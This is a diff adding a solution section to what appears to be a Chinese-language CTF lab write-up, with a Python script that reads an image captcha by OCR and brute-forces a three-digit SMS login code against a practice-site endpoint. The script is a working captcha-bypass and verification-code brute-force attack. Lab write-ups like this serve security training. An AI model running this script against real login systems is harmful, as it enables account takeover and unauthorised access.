@@ -79,4 +79,43 @@ binaryImage = im.point(initTable(),'1')
 """
 print(image_to_string(binaryImage,config='-psm 7'))
 ```
+# 0x04 原题解题脚本
+思路：手机验证码三位，用爆破，vcode.png直接识别
 
+```
+import requests
+from PIL import Image
+from pytesseract import image_to_string
+# 图像识别
+def initTable(threshold = 140):
+    table = []
+    for i in range(256):
+        if i< threshold:
+            table.append(0)
+        else:
+            table.append(1)
+    return table
+def imagevcode_to_string(url):
+    im = Image.open(url)
+    im = im.convert('L')
+    binaryImage = im.point(initTable(),'1')
+    return image_to_string(binaryImage,config='-psm 7')
+
+s = requests.session()
+url = 'http://lab1.xseclab.com/vcode7_f7947d56f22133dbc85dda4f28530268/'
+r = s.get(url)
+s.post(url+"mobi_vcode.php",data={'getcode':'1','mobi':'13388886666'})
+for i in range(100,1000):
+    print('测试手机验证码：'+str(i))
+    img = s.get(url+'vcode.php')
+    with open("vcode.png",'wb') as f:
+        f.write(img.content)
+    j = imagevcode_to_string('vcode.png')
+    r = s.post(url+'login.php',data={'username':'13388886666','mobi_code':i,'user_code':j,'Login':'submit'})
+    if 'error' not in r.text:
+        print('正确验证码为：'+str(i))
+        print(r.text)
+        break
+```
+
+验证码识别还可以用PKAV HTTP Fuzzer
